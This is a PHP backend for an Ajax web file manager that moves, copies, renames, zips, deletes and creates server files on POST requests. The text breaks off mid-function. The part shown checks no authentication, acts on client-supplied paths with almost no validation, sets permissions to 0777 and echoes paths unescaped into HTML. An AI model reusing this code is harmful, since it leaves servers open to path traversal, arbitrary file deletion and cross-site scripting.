<?php
/***********************************************************************************************************
* File System using Ajax, Jquery and PHP v4.0 
* Written by Vasplus Programming Blog
* Website: www.vasplus.info
* Email: info@vasplus.info

**********************************Copyright Information*****************************************************
* This script has been released with the aim that it will be useful.
* Please, do not remove this copyright information from the top of this page 
  including the Powered by Vasplus Programming Blog Icon.
* If you want the copyright info including the Powered by Vasplus Programming Blog icon 
  to be removed from the script then you have to buy this script.
* This script must not be used for commercial purpose without the consent of Vasplus Programming Blog.
* This script must not be sold.
* All Copy Rights Reserved by Vasplus Programming Blog
*************************************************************************************************************/
session_start();
ini_set('error_reporting', '');

$vpb_root_or_start_directory = '.'; //This is the default and first directory to start showing files from
$vpb_add_to_url = false; //Default and please leave this field alone
$vpb_show_directories = true; //This will show the directories on your server when set to true and hide them when set to false
$vpb_show_files = true; //This will show the files on your server when set to true and hide them when set to false


//Any file pace in this array will be hidden from the file system displayed files on the screen
$vpb_hide_these_files = array('default_system_files', 'default_system_index.php', 'default_system_actions.php', '.htaccess', '.htpasswd');

//Calculate Directories sizes
function vpb_show_directory_sizes($vpb_directory_location)
{
	$vpb_totalsize = 0;
	$vpb_totalcount = 0;
	$vpb_directory_count = 0;
	if ($vpb_files_handlers = opendir ($vpb_directory_location))
	{
		while (false !== ($file = readdir($vpb_files_handlers)))
		{
			$vpb_next_location = $vpb_directory_location . DIRECTORY_SEPARATOR . $file;
			if ($file != '.' && $file != '..' && !is_link ($vpb_next_location))
			{
				if (is_dir ($vpb_next_location))
				{
					$vpb_directory_count++;
					$vpb_out_come = vpb_show_directory_sizes($vpb_next_location);
					$vpb_totalsize += $vpb_out_come['size'];
					$vpb_totalcount += $vpb_out_come['count'];
					$vpb_directory_count += $vpb_out_come['dircount'];
				}
				elseif (is_file ($vpb_next_location))
				{
					$vpb_totalsize += filesize ($vpb_next_location);
					$vpb_totalcount++;
				}
			}
		}
	}
	closedir ($vpb_files_handlers);
	$vpb_total['size'] = $vpb_totalsize;
	$vpb_total['count'] = $vpb_totalcount;
	$vpb_total['dircount'] = $vpb_directory_count;
	return $vpb_total;
}

//File size formats
function vpb_show_file_size_formats($size)
{
	if($size<1024)
	{
		return $size." bytes";
	}
	else if($size<(1024*1024))
	{
		$size=round($size/1024,1);
		return $size." KB";
	}
	else if($size<(1024*1024*1024))
	{
		$size=round($size/(1024*1024),1);
		return $size." MB";
	}
	else
	{
		$size=round($size/(1024*1024*1024),1);
		return $size." GB";
	}
}

//Compress files
function vpb_file_compression($source, $destination)
{
	if (!extension_loaded('zip') || !file_exists($source)) 
	{
		return false;
	}
	$zip = new ZipArchive();
	if (!$zip->open($destination, ZIPARCHIVE::CREATE)) 
	{
		return false;
	}
	$source = str_replace('\\', '/', realpath($source));
	if (is_dir($source) === true)
	{
		$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
		foreach ($files as $file)
		{
			$file = str_replace('\\', '/', realpath($file));
	
			if (is_dir($file) === true)
			{
				$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
			}
			else if (is_file($file) === true)
			{
				$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
			}
		}
	}
	else if (is_file($source) === true)
	{
		$zip->addFromString(basename($source), file_get_contents($source));
	}
	return $zip->close();
}

//This is the function that does all file deletion
function vpb_delete_directory_and_contents($vpb_directory_location) 
{
	if ($dhandle = opendir($vpb_directory_location)) //If open the specified dir, then proceed
	{
		//Loop through the openned dir
		while (false !== ($fname = readdir($dhandle)))
		{
			 //If the element is a directory, and does not start with a '.' or '..', we call vpb_delete_directory_and_contents function recursively passing this element as a parameter
			 if (is_dir( $vpb_directory_location.DIRECTORY_SEPARATOR.$fname )) 
			 {
				 if (($fname != '.') && ($fname != '..'))
				 {
					 //Deleting Files in the Directory: {$vpb_directory_location}/{$fname}
					 vpb_delete_directory_and_contents($vpb_directory_location.DIRECTORY_SEPARATOR.$fname);
				}
			 }
			 else //The element is a file, so we delete it
			 {
				 //Deleting File: {$vpb_directory_location}/{$fname}
				 @unlink($vpb_directory_location.DIRECTORY_SEPARATOR.$fname);
			 }
		}
		closedir($dhandle);
	}
	//The directory is now empty and so, we can use the rmdir() function to delete it
	//Deleting Directory: {$vpb_directory_location}
	chmod($vpb_directory_location,0777);
	rmdir($vpb_directory_location);
}

//Copy files and directories
function vpb_copy_files_and_directories($source, $dest, $final_dest = '')
{ 
    $sourceHandle = opendir($source); 
    if(!$final_dest)
		$final_dest = $source; 
    
	chmod($dest . DIRECTORY_SEPARATOR . $final_dest,0777);
    @mkdir($dest . DIRECTORY_SEPARATOR . $final_dest); 
    
    while($vpb_reader = readdir($sourceHandle))
	{ 
        if($vpb_reader == '.' || $vpb_reader == '..') 
            continue; 
        
        if(is_dir($source . DIRECTORY_SEPARATOR . $vpb_reader))
		{ 
            vpb_copy_files_and_directories($source . DIRECTORY_SEPARATOR . $vpb_reader, $dest, $final_dest . DIRECTORY_SEPARATOR . $vpb_reader); 
        } 
		else 
		{ 
            copy($source . DIRECTORY_SEPARATOR . $vpb_reader, $dest . DIRECTORY_SEPARATOR . $final_dest . DIRECTORY_SEPARATOR . $vpb_reader); 
        } 
    } 
} 

//Remove Slashes from Dir Path
function vpv_count_slashes($vpb_slashes)
{	
	return substr_count(strip_tags($vpb_slashes), '/');
}
	
					
If(isset($_POST['page']) && !empty($_POST['page']) || isset($_GET['page']) && !empty($_GET['page'])) //Page Validation
{
	if($_POST['page'] == "move") //Move File Page
	{
		$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"]));
		
		if(is_file($vpb_this_directory_or_file))
		{
			//Do not since its a file and not a director
		}
		else
		{
			if(substr(trim(strip_tags($_POST["vpb_this_directory_or_file"])), -1, 1)!='/') 
			{
				//$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"])).'/';
			}
		}
		
		if(substr(trim(strip_tags($_POST["vpb_to_this_directory"])), -1, 1)!='/') 
		{
			$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"])).'/';
		}
		
		//Check for inappropriate words for a directory
		if($vpb_to_this_directory == "" || $vpb_to_this_directory == "." || $vpb_to_this_directory == ".." || $vpb_to_this_directory == "''" || $vpb_to_this_directory == '"' || $vpb_to_this_directory == "'" || $vpb_to_this_directory == ";" || $vpb_to_this_directory == ";;" || $vpb_to_this_directory == "*" || $vpb_to_this_directory == "**" || $vpb_to_this_directory == '""' || $vpb_to_this_directory == "!" || $vpb_to_this_directory == "!!" || $vpb_to_this_directory == "`" || $vpb_to_this_directory == "``" || $vpb_to_this_directory == "|" || $vpb_to_this_directory == "||" || $vpb_to_this_directory == "//" || $vpb_to_this_directory == "///" || $vpb_to_this_directory == "////" ||$vpb_to_this_directory == "..//" || $vpb_to_this_directory == ".//" || $vpb_to_this_directory == "/"  || $vpb_to_this_directory == "./" || $vpb_to_this_directory == "+" || $vpb_to_this_directory == "-" || $vpb_to_this_directory == "_" || $vpb_to_this_directory == ")" || $vpb_to_this_directory == "(" || $vpb_to_this_directory == "()" || $vpb_to_this_directory == "%" || $vpb_to_this_directory == "^" || $vpb_to_this_directory == "£" || $vpb_to_this_directory == "$" || $vpb_to_this_directory == "=" || $vpb_to_this_directory == "?" || $vpb_to_this_directory == "??" || $vpb_to_this_directory == "<" || $vpb_to_this_directory == ">" || $vpb_to_this_directory == "<>" || $vpb_to_this_directory == "," || $vpb_to_this_directory == ",," || $vpb_to_this_directory == "]" || $vpb_to_this_directory == "[" || $vpb_to_this_directory == "[]" || $vpb_to_this_directory == "{" || $vpb_to_this_directory == "}" || $vpb_to_this_directory == "{}" || $vpb_to_this_directory == "@" || $vpb_to_this_directory == "@@" || $vpb_to_this_directory == "#" || $vpb_to_this_directory == "##" || $vpb_to_this_directory == "#@" || $vpb_to_this_directory == "@#" || $vpb_to_this_directory == ".")
		{
			if(is_file($vpb_this_directory_or_file))
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to move this file in the field specified below. Thanks...</div><br clear="all">';
			}
			else
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to move this directory in the field specified below. Thanks...</div><br clear="all">';
			}
		}
		else
		{
			if(file_exists($vpb_to_this_directory))
			{
				if(is_dir($vpb_to_this_directory) && is_file($vpb_this_directory_or_file))
				{
					if($vpb_this_directory_or_file == $vpb_to_this_directory.basename($vpb_this_directory_or_file))
					{
						echo '<div class="info" align="left">Sorry, such operation is not allowed. <br>You can not move the file <b>'.$vpb_this_directory_or_file.'</b> into the file <b>'.$vpb_to_this_directory.basename($vpb_this_directory_or_file).'</b>. <br>Thank you!</div><br clear="all">';
					}
					else
					{
						if(!file_exists($vpb_this_directory_or_file))
						{
							 echo '<div class="info" align="left">Sorry, the file <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
						}
						else
						{
							if(copy($vpb_this_directory_or_file,$vpb_to_this_directory.basename($vpb_this_directory_or_file)))
							{
								chmod($vpb_this_directory_or_file,0777);
								@unlink($vpb_this_directory_or_file);
								echo '<font style="font-size:0px;">success</font>';
								echo '<div class="info" align="left">Congrats, that was a success!<br><br>
								<b>MOVED:</b> '.$vpb_this_directory_or_file.'<br><br> <b>TO:</b> '.$vpb_to_this_directory.basename($vpb_this_directory_or_file);
								echo '</div><br clear="all">';
							}
							else
							{
								echo '<div class="info" align="left">Sorry, the file <b>'.$vpb_this_directory_or_file.'</b> could not be moved at the moment. Please try again okay. Thanks...</div><br clear="all">';
							}
						}
					}
				}
				elseif(is_dir($vpb_to_this_directory) && is_dir($vpb_this_directory_or_file))
				{
					if($vpb_this_directory_or_file == $vpb_to_this_directory.basename($vpb_this_directory_or_file))
					{
						echo '<div class="info" align="left">Sorry, such operation is not allowed. <br>You can not move the directory <b>'.$vpb_this_directory_or_file.'</b> into the directory <b>'.$vpb_to_this_directory.basename($vpb_this_directory_or_file).'</b>. <br>Thank you!</div><br clear="all">';
					}
					else
					{
						if(!file_exists($vpb_this_directory_or_file))
						{
							 echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
						}
						else
						{
							if(file_exists($vpb_to_this_directory.basename($vpb_this_directory_or_file))) 
							{
								chmod($vpb_this_directory_or_file,0777);
								chmod($vpb_to_this_directory.basename($vpb_this_directory_or_file),0777);
								vpb_delete_directory_and_contents($vpb_to_this_directory.basename($vpb_this_directory_or_file));
								$vpb_ok = rename($vpb_this_directory_or_file, $vpb_to_this_directory.basename($vpb_this_directory_or_file));
							 } 
							 else 
							 {
								  chmod($vpb_this_directory_or_file,0777);
								  chmod($vpb_to_this_directory.basename($vpb_this_directory_or_file),0777);
								  $vpb_ok = rename($vpb_this_directory_or_file, $vpb_to_this_directory.basename($vpb_this_directory_or_file)); 
							 }
							 if($vpb_ok)
							 {
								 //Call vpb_delete_directory_and_contents function and pass a directory name as a parameter to it
								vpb_delete_directory_and_contents($vpb_this_directory_or_file);
								echo '<font style="font-size:0px;">success</font>';
								echo '<div class="info" align="left">Congrats, that was a success!<br><br>
								<b>MOVED:</b> '.$vpb_this_directory_or_file.'<br><br> <b>TO:</b> '.$vpb_to_this_directory.basename($vpb_this_directory_or_file);
								echo '</div><br clear="all">';
							 }
							 else
							 {
								echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_this_directory_or_file.'</b> could not be moved at the moment. Please try again okay. Thanks...</div><br clear="all">';
							 }
						}
					}
				}
				else
				{
					echo '<div class="info" align="left">Sorry, we could not verify the operation you were trying to perform. Please try again. Thanks...</div><br clear="all">';
				}
			}
			else
			{
				echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_to_this_directory.'</b> does not exist on this server. <br>Please create this directory before you can move any file into it. Thanks...</div><br clear="all">';
			}
		}
	}
	elseif($_POST['page'] == "copy") //Copy File Page
	{
		$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"]));
		
		if(is_file($vpb_this_directory_or_file))
		{
			//Do not since its a file and not a director
		}
		else
		{
			if(substr(trim(strip_tags($_POST["vpb_this_directory_or_file"])), -1, 1)!='/') 
			{
				//$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"])).'/';
			}
		}
		if(substr(trim(strip_tags($_POST["vpb_to_this_directory"])), -1, 1)!='/') 
		{
			$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"])).'/';
		}
		
		//Check for inappropriate words for a directory
		if($vpb_to_this_directory == "" || $vpb_to_this_directory == "." || $vpb_to_this_directory == ".." || $vpb_to_this_directory == "''" || $vpb_to_this_directory == '"' || $vpb_to_this_directory == "'" || $vpb_to_this_directory == ";" || $vpb_to_this_directory == ";;" || $vpb_to_this_directory == "*" || $vpb_to_this_directory == "**" || $vpb_to_this_directory == '""' || $vpb_to_this_directory == "!" || $vpb_to_this_directory == "!!" || $vpb_to_this_directory == "`" || $vpb_to_this_directory == "``" || $vpb_to_this_directory == "|" || $vpb_to_this_directory == "||" || $vpb_to_this_directory == "//" || $vpb_to_this_directory == "///" || $vpb_to_this_directory == "////" ||$vpb_to_this_directory == "..//" || $vpb_to_this_directory == ".//" || $vpb_to_this_directory == "/"  || $vpb_to_this_directory == "./" || $vpb_to_this_directory == "+" || $vpb_to_this_directory == "-" || $vpb_to_this_directory == "_" || $vpb_to_this_directory == ")" || $vpb_to_this_directory == "(" || $vpb_to_this_directory == "()" || $vpb_to_this_directory == "%" || $vpb_to_this_directory == "^" || $vpb_to_this_directory == "£" || $vpb_to_this_directory == "$" || $vpb_to_this_directory == "=" || $vpb_to_this_directory == "?" || $vpb_to_this_directory == "??" || $vpb_to_this_directory == "<" || $vpb_to_this_directory == ">" || $vpb_to_this_directory == "<>" || $vpb_to_this_directory == "," || $vpb_to_this_directory == ",," || $vpb_to_this_directory == "]" || $vpb_to_this_directory == "[" || $vpb_to_this_directory == "[]" || $vpb_to_this_directory == "{" || $vpb_to_this_directory == "}" || $vpb_to_this_directory == "{}" || $vpb_to_this_directory == "@" || $vpb_to_this_directory == "@@" || $vpb_to_this_directory == "#" || $vpb_to_this_directory == "##" || $vpb_to_this_directory == "#@" || $vpb_to_this_directory == "@#" || $vpb_to_this_directory == ".")
		{
			if(is_file($vpb_this_directory_or_file))
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to copy this file in the field specified below. Thanks...</div><br clear="all">';
			}
			else
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to copy this directory in the field specified below. Thanks...</div><br clear="all">';
			}
		}
		else
		{
			if(file_exists($vpb_to_this_directory))
			{
				if(is_dir($vpb_to_this_directory) && is_file($vpb_this_directory_or_file))
				{
					if($vpb_this_directory_or_file == $vpb_to_this_directory.basename($vpb_this_directory_or_file))
					{
						echo '<div class="info" align="left">Sorry, such operation is not allowed. <br>You can not copy the file <b>'.$vpb_this_directory_or_file.'</b> into the file <b>'.$vpb_to_this_directory.basename($vpb_this_directory_or_file).'</b>. <br>Thank you!</div><br clear="all">';
					}
					else
					{
						if(!file_exists($vpb_this_directory_or_file))
						{
							 echo '<div class="info" align="left">Sorry, the file <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
						}
						else
						{
							if(copy($vpb_this_directory_or_file,$vpb_to_this_directory.basename($vpb_this_directory_or_file)))
							{
								echo '<font style="font-size:0px;">success</font>';
								echo '<div class="info" align="left">Congrats, that was a success!<br><br>
								<b>COPIED:</b> '.$vpb_this_directory_or_file.'<br><br> <b>TO:</b> '.$vpb_to_this_directory.basename($vpb_this_directory_or_file);
								echo '</div><br clear="all">';
							}
							else
							{
								echo '<div class="info" align="left">Sorry, the file <b>'.$vpb_this_directory_or_file.'</b> could not be copied at the moment. Please try again okay. Thanks...</div><br clear="all">';
							}
						}
					}
				}
				elseif(is_dir($vpb_to_this_directory) && is_dir($vpb_this_directory_or_file))
				{
					if($vpb_this_directory_or_file == $vpb_to_this_directory.basename($vpb_this_directory_or_file))
					{
						echo '<div class="info" align="left">Sorry, such operation is not allowed. <br>You can not copy the directory <b>'.$vpb_this_directory_or_file.'</b> into the directory <b>'.$vpb_to_this_directory.basename($vpb_this_directory_or_file).'</b>. <br>Thank you!</div><br clear="all">';
					}
					else
					{
						if(!file_exists($vpb_this_directory_or_file))
						{
							 echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
						}
						else
						{
							if(!vpb_copy_files_and_directories($vpb_this_directory_or_file,$vpb_to_this_directory,basename($vpb_this_directory_or_file)))
							{
								echo '<font style="font-size:0px;">success</font>';
								echo '<div class="info" align="left">Congrats, that was a success!<br><br>
								<b>COPIED:</b> '.$vpb_this_directory_or_file.'<br><br> <b>TO:</b> '.$vpb_to_this_directory.basename($vpb_this_directory_or_file);
								echo '</div><br clear="all">';
							}
							else
							{
								echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_this_directory_or_file.'</b> could not be copied at the moment. Please try again okay. Thanks...</div><br clear="all">';
							}
						}
					}
				}
				else
				{
					echo '<div class="info" align="left">Sorry, we could not verify the operation you were trying to perform. Please try again. Thanks...</div><br clear="all">';
				}
			}
			else
			{
				echo '<div class="info" align="left">Sorry, the directory <b>'.$vpb_to_this_directory.'</b> does not exist on this server. <br>Please create this directory before you can copy any file into it. Thanks...</div><br clear="all">';
			}
		}
	}
	elseif($_POST['page'] == "rename") //Rename File Page
	{
		$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"]));
		
		if($vpb_to_this_directory == "")
		{
			if(is_file($vpb_this_directory_or_file))
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to rename this file in the field specified below. Thanks...</div><br clear="all">';
			}
			else
			{
				echo '<div class="info" align="left">Please type the directory path to where you want to rename this directory in the field specified below. Thanks...</div><br clear="all">';
			}
		}
		else
		{
			if($vpb_this_directory_or_file == $vpb_to_this_directory)
			{
				echo '<div class="info" align="left">Sorry, such operation is not allowed. <br>You can not rename <b>'.$vpb_this_directory_or_file.'</b> to <b>'.$vpb_to_this_directory.'</b> in the same directory. <br>This file will completely be lost if you proceed. <br>Thank you!</div><br clear="all">';
			}
			else
			{
				if(!file_exists($vpb_this_directory_or_file))
				{
					 echo '<div class="info" align="left">Sorry, <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
				}
				else
				{
					if(file_exists($vpb_to_this_directory)) 
					{
						chmod($vpb_this_directory_or_file,0777);
						chmod($vpb_to_this_directory,0777);
						if(is_file($vpb_to_this_directory))
						{
							@unlink($vpb_to_this_directory);
						}
						else
						{
							vpb_delete_directory_and_contents($vpb_to_this_directory);
						}
						$vpb_ok = rename($vpb_this_directory_or_file, $vpb_to_this_directory);
					 } 
					 else 
					 {
						  chmod($vpb_this_directory_or_file,0777);
						  chmod($vpb_to_this_directory,0777);
						  $vpb_ok = rename($vpb_this_directory_or_file, $vpb_to_this_directory); 
					 }
					 if($vpb_ok)
					 {
						 if(is_file($vpb_to_this_directory))
						 {
							if(isset($_SESSION["class"]))
							{
								if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
								else $_SESSION["class"] = 'vpb_white';
							}
							else
							{
								$_SESSION["class"] = 'vpb_white';
							}
							
							$filename = $vpb_to_this_directory;
							$filenamed = $vpb_to_this_directory;
							if(strlen($filename)>50) 
							{
								$filenamed = substr($filename, 0, 47) . '...';
							}
							//Get file extensions
							$vpb_file_extensions = pathinfo($filename, PATHINFO_EXTENSION);
							
							//Get file sizes
							$getSizes = filesize($filename);
							$total_size = vpb_show_file_size_formats($getSizes);
							
							//Check file types for proper icon assignments
							if($vpb_file_extensions == "php")
							{
								$file_icon = '<img src="default_system_files/php.png" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "html" || $vpb_file_extensions == "htm"  || $vpb_file_extensions == "htm")
							{
								$file_icon = '<img src="default_system_files/html.png" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "txt")
							{
								$file_icon = '<img src="default_system_files/txt.png" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "zip" || $vpb_file_extensions == "rar")
							{
								$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "pdf")
							{
								$file_icon = '<img src="default_system_files/pdf.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "exe")
							{
								$file_icon = '<img src="default_system_files/exe.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "mpg" || $vpb_file_extensions == "mpeg" || $vpb_file_extensions == "mov" || $vpb_file_extensions == "avi")
							{
								$file_icon = '<img src="default_system_files/video.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "xls")
							{
								$file_icon = '<img src="default_system_files/xls.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "asc")
							{
								$file_icon = '<img src="default_system_files/asc.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "eps")
							{
								$file_icon = '<img src="default_system_files/eps.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "rm")
							{
								$file_icon = '<img src="default_system_files/real.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "psd")
							{
								$file_icon = '<img src="default_system_files/psd.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "setup")
							{
								$file_icon = '<img src="default_system_files/setup.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "fla")
							{
								$file_icon = '<img src="default_system_files/fla.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "doc" || $vpb_file_extensions == "docx")
							{
								$file_icon = '<img src="default_system_files/doc.gif" align="absmiddle">';
							}
							elseif($vpb_file_extensions == "jpg" || $vpb_file_extensions == "jpeg" || $vpb_file_extensions == "gif" || $vpb_file_extensions == "png")
							{
								$file_icon = '<img src="default_system_files/images_file.gif" align="absmiddle">';
							}
							else
							{
								$file_icon = '<img src="default_system_files/general.png" align="absmiddle">';
							}
							?>
							<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', basename($filename)); ?>" align="left" style="width:100%;" class="<?php echo $_SESSION["class"]; ?>">
		<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo basename($filenamed); ?></div></a>
		<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
		<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($filename));?></div>
		<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($filename); ?>');">Option</div>
		<br clear="all" />
		</div>
							<?php
							echo '<font style="font-size:0px;">success</font>';
							
						 }
						 else if(is_dir($vpb_to_this_directory))
						 {
							 if(isset($_SESSION["class"]))
							 {
								if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
								else $_SESSION["class"] = 'vpb_white';
							 }
							 else
							 {
								$_SESSION["class"] = 'vpb_white';
							 }
							 
							 
							 $getSizes = vpb_show_directory_sizes($vpb_to_this_directory);
							 $total_size = vpb_show_file_size_formats($getSizes['size']);
							 
							?>
							<div id="directory_id<?php echo str_replace('/', '', basename($vpb_to_this_directory)); ?>" align="left" class="<?php echo $_SESSION["class"]; ?>" style="width:100%;">
				 <a href="javascript:void(0);" onclick="vpb_file_system_displayer('<?php echo urlencode($vpb_to_this_directory); ?>');"><div id="vpb_files_left" class="hove_this_link"><img src="default_system_files/folder.png" border="0" alt="<?php echo $vpb_to_this_directory; ?>" /><?php if(!str_replace('/', '', $vpb_to_this_directory)) echo basename($vpb_to_this_directory); else echo str_replace('/', '', basename($vpb_to_this_directory)); ?></div></a>
				<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
				<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($vpb_to_this_directory)); ?></div>
				<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($vpb_to_this_directory); ?>');">Option</div>
				<br clear="all" />
				</div>
							
							<?php
							echo '<font style="font-size:0px;">success</font>';
						 }
						 else
						 {
							 echo '<div class="info" align="left">Unknown Request! Sorry, we could not verify the operation you were trying to perform at this point. Please try again. Thanks...</div><br clear="all">';
						 }
					 }
					 else
					 {
						echo '<div class="info" align="left">Sorry, renaming <b>'.$vpb_this_directory_or_file.'</b> to <b>'.$vpb_to_this_directory.'</b> was unsuccessful.<br><b>Note:</b> You must enter a correct and existing directory path to rename a file or directory. <br>Thanks...</div><br clear="all">';
					 }
				}
			}
		}	
	}
	elseif($_POST['page'] == "compress") //Compress File Page
	{
		$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		$vpb_to_this_directory = str_replace('.zip', '', trim(strip_tags($_POST["vpb_to_this_directory"])));
			
		if($vpb_to_this_directory == "")
		{
			 echo '<div class="info" align="left">Please enter the name that you wish to give to the compressed file in the field specified below. Thanks...</div><br clear="all">';
		}
		else
		{
			if(!file_exists($vpb_this_directory_or_file))
			{
				 echo '<div class="info" align="left">Sorry, <b>'.$vpb_this_directory_or_file.'</b> does not exist on this server. Thanks...</div><br clear="all">';
			}
			else
			{
				if(file_exists($vpb_to_this_directory.'.zip'))
				{
					chmod($vpb_to_this_directory.'.zip', 0777);
					@unlink($vpb_to_this_directory.'.zip');
				}
				chmod($vpb_to_this_directory, 0777);
				if(vpb_file_compression($vpb_this_directory_or_file,$vpb_to_this_directory.'.zip'))
				{
					if(isset($_SESSION["class"]))
					{
						if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
						else $_SESSION["class"] = 'vpb_white';
					}
					else
					{
						$_SESSION["class"] = 'vpb_white';
					}
					
					echo '<font style="font-size:0px;">success</font>';
					
					$filename = $vpb_to_this_directory.'.zip';
					$filenamed = $vpb_to_this_directory.'.zip';
					if(strlen($filename)>50) 
					{
						$filenamed = substr($filename, 0, 47) . '...';
					}
					
					//Get file sizes
					$getSizes = filesize($filename);
					$total_size = vpb_show_file_size_formats($getSizes);
					
					//Check file types for proper icon assignments
					$file_icon = '<img src="default_system_files/archive.png" align="absmiddle">';
					
					//Get file extensions
					$vpb_file_extensions = pathinfo($filename, PATHINFO_EXTENSION);
					
					?>
					<div id="directory_id<?php echo str_replace('.'.$vpb_file_extensions, '', basename($filename)); ?>" align="left" style="width:100%;" class="<?php echo $_SESSION["class"]; ?>">
	<a href="default_system_files/download.php?vpb_download_item=<?php echo $filename; ?>"><div id="vpb_files_left" class="hove_this_link"><?php echo $file_icon; ?><?php echo basename($filenamed); ?></div></a>
	<div id="vpb_files_size_left"><?php echo $total_size; ?></div>
	<div id="vpb_files_time_left"><?php echo date ("M d, Y h:i A", filemtime($filename));?></div>
	<div id="vpb_files_acttions_left" class="vpb_files_acttions_left_hover" onclick="vpb_directory_options_box('<?php echo basename($filename); ?>');">Option</div>
	<br clear="all" />
	</div>
					<?php
				}
				else
				{
					echo '<div class="info" align="left">Sorry, compressing <b>'.$vpb_this_directory_or_file.'</b> to <b>'.$vpb_to_this_directory.'.zip</b> was unsuccessful.<br>Please try again or contact the system developer to report the error message if this problem persist.<br> Thanks...</div><br clear="all">';
				}
				 
			}
		}
	}
	elseif($_POST['page'] == "delete") //Delete File Page
	{
		//$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		//$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"]));
		$directory_or_file_to_delete_name = trim(strip_tags($_POST["directory_or_file_to_delete_name"]));
		
		if(is_file($directory_or_file_to_delete_name))
		{
			chmod($directory_or_file_to_delete_name,0777);
			@unlink($directory_or_file_to_delete_name);
		}
		else
		{
			if(substr(trim(strip_tags($_POST["vpb_this_directory_or_file"])), -1) == '//') 
			{
				$directory_or_file_to_delete_name = substr(trim(strip_tags($_POST["directory_or_file_to_delete_name"])), 0, -1);
			}
			chmod($directory_or_file_to_delete_name,0777);
			vpb_delete_directory_and_contents($directory_or_file_to_delete_name);
		}
		
	}
	elseif($_POST['page'] == "create") //Create Files or Directories Page
	{
		$vpb_to_this_directory = trim(strip_tags($_POST["vpb_to_this_directory"]));
		$vpb_this_directory_or_file = trim(strip_tags($_POST["vpb_this_directory_or_file"]));
		
		if($vpb_to_this_directory == "")
		{
			echo '<div class="info" align="left">Please enter the path to where you want to create your file or directory along with your desired file or directory name in the field specified below to proceed.<br> Thanks...</div><br clear="all">';
		}
		else
		{
			if($vpb_this_directory_or_file == "File")
			{
				if(file_exists($vpb_to_this_directory))
				{
					chmod($vpb_to_this_directory,0777);
					@unlink($vpb_to_this_directory);
				}
				
				$vpb_file_extensions = pathinfo($vpb_to_this_directory, PATHINFO_EXTENSION);
				if($vpb_file_extensions == "")
				{
					$vpb_to_this_directory = $vpb_to_this_directory.'.txt';
				}
				
				$vpb_create_new_file = @fopen($vpb_to_this_directory, "w");
				if ($vpb_create_new_file) 
				{
					@fclose($vpb_create_new_file);
					
					echo '<font style="font-size:0px;">success</font>';
					
					if(isset($_SESSION["class"]))
					{
						if($_SESSION["class"]=='vpb_white') $_SESSION["class"]='vpb_blue';
						else $_SESSION["class"] = 'vpb_white';
					}
					else
					{
						$_SESSION["class"] = 'vpb_white';
					}
					
					$filename = $vpb_to_this_directory;
					$filenamed = $vpb_to_this_directory;
					if(strlen($filename)>50) 
					{
						$filenamed = substr($filename, 0, 47) . '...';
					}
					//Get file extensions
